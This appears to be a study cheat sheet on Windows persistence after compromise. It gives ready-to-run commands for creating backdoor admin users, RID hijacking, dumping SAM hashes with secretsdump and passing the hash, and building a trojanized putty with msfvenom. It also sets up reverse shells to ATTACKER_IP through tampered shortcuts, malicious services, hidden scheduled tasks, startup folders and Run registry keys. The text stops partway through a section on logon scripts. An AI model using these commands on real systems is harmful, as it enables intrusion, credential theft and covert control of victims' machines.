# Tools Used

 - Evil-WinRM
 - PsExec64.exe
 - secretsdump.py

# Remote connection to Windows machine

| Desctipyion                                                | Command                                                   |
| :---                                                       | :---                                                      |
| Establishing remote connection to windows machine          | `evil-winrm -i >MACHINE_IP> -u <USER> -p <PASSWORD>`      | 

# Establishing Backdoor Users by changing their permission

## By adding users to groups
| Desctipyion                                                | Command                                                   |
| :---                                                       | :---                                                      |
| Adding user to `administrators` group                      | `net localgroup administrators <USER> /add`               |
| Adding user to `remote management user` group              | `net localgroup "Remote Management Users" <USER> /add`    | 


Sometimes adding yourself to the `remote` group will not allow you to access the machine straight away as the group might be disabled. This can be verified using the `whoami /group` command. This is due to the User Access Control (UAC). To make this work you will have to disable `LocalAccountTokenFilterPolicy`.

 ``reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1``

## By giving users Special Privileges and Security Descriptors
Special groups are only special because the operating system assigns them specific privileges by default. We can add users to these special groups by using `secedit`.

| Desctipyion                                                | Command                                                   |
| :---                                                       | :---                                                      |
| Export the current configurations                          | `secedit /export /cfg config.inf`                         |
| Open the file and add the user to `SeBackupPrivilege`      | `SeBackupPrivilege = <USER1>, <MALICIOUS_USER>`           |
| Open the file and add the user to `SeRestorePrivilege`     | `SeRestorePrivilege = <USER1>, <MALICIOUS_USER>`          |
| Convert the `.inf` file into a `.sdb` file                 | `secedit /import /cfg config.inf /db config.sdb`          | 
| Load the configuration back into the system                | `secedit /configure /db config.sdb /cfg config.inf`       |

If the following does not work we can change the security descriptor to allow `<MALICIOUS_USER>` to connect. You can use Powershell to open the configuration:

 - ``Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI``
 - Add the `<MALICOUS_USER>`
 - Give `Full Control` Access

## RID Hijacking
This method is used by changing some registry values and tricking the system to think you are the Administrator. In any system default Administrator account is assigned `RID = 500` and all other users `RID >= 1000`.

RID can be spot easily as they are the last bit of the SID. For example:
 - SID: S-1-5-21-1966530601-3185510712-10604624-500
 - RID: 500

| Desctipyion                                | Command                                                  |
| :---                                       | :---                                                     |
| Find assigned RID of a user                | `wmic useraccount get name,sid`                          | 
| Use PsExec to access SAM using Regedit     | `PsExec64.exe -i -s regedit`                             | 
| Go to                                      | `HKLM\SAM\SAM\Domains\Account\Users\`                    |

Once Regedit is opened you will need to find the key of the user who will be getting the admin privilege. The keys are in Hex value wo you will need to use a Hex calculator to change the last digits of the SID to hex. Once the folder is found open the `F` binary file, which holds the user's effective RID at position 0x30. The RID is stored using little-endian hence the bytes are reversed. Hence replace the byrtes accordingly which is `F4 01`.  

## Collect SAM and System files

| Desctipyion                            | Command                                                                                 |
| :---                                   | :---                                                                                    |
| Save `system.bak` files                | `reg save hklm\system system.bak`                                                       |
| Save `sam.bak` files                   | `reg save hklm\sam sam.bak`                                                             |
| Download files                         | `download system.bak` and `download sam.bak`                                            |
| Dump password hashes for all users     | `python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCALi`|
| Perform `Pass-the-Hash`                | `evil-winrm -i <MACHINE_IP> -u <USER> -H <HASH>`                                        |


# Creating Backdoors through common used files

## Creating executable files
You can plant a payload to the users machine and create an executable file using `msvenom` to create a backdoor putty.

``msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe``

## Shortcut files
We can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

Create a powershell payload:

``Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe``

Add the following path to a malicious shortcut file. `-windowstyle hidden` ensures that the script is run in the background:
``powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1`` 

## Hijacking File Associations
In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

# Creating Backdoor services
Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

## Create a new service
Create and start a  malicious service to change administrator password upon restart

``sc.exe create MALICIOUS_SERVICE binPath= "net user Administrator Passwd123" start= auto
sc.exe start MALICIOUS_SERVICE`` 

Creata and start a malicious service to establish a reverse shell when computer starts

``msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe``

``sc.exe create MALICIOUS_SERVICE binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start MALICIOUS_SERVICE``

## Modify existing services
Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it. There are three things we care about when using a service for persistence:

 - The executable `(BINARY_PATH_NAME)` should point to our payload.
 - The service `START_TYPE` should be automatic so that the payload runs without user interaction.
 - The `SERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges. 

You can get a list of available services using the following command:
``sc.exe query state=all``

Query the service configuration:
``sc.exe qc MALICIOUS_SERVICE``

Create a reverse shell:
``msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe``

Modify the stopped service with the binay path to the malicious reverse shell
``sc.exe config <STOPPED_SERVICE>  binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"``

# Create a Scheduled Task

Create the scheduled task:
``schtasks /create /sc minute /mo 1 /tn <TASK_NAME> /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM``

Make the task invisible by making some changes to registry keys. Open regedit:
``c:\tools\pstools\PsExec64.exe -s -i regedit``

Go to the specific location and find your service <TASK_NAME>:
``HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\``

Delete the `SD` key. The `SD` key is the Security Descriptor.

# Creating Logon Triggers

## Through startup folders
Generate reverse shell payload
``msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe``

Copy the payload to the generic startup folder:
``copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"``

## Through Registry Key
The following registry vlaues can be edited to run programs.The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

 - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 - HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

Go to any of the regirty key location and create a backdoor `REG_EXPAND_SZ`. The data will be the path for your malixcious prorgam.

## Through Winlogon
Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

 - `Userinit` points to userinit.exe, which is in charge of restoring your user profile preferences.
 - `shell` points to the system's shell, which is usually explorer.exe.

## Through Logon Scripts
To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

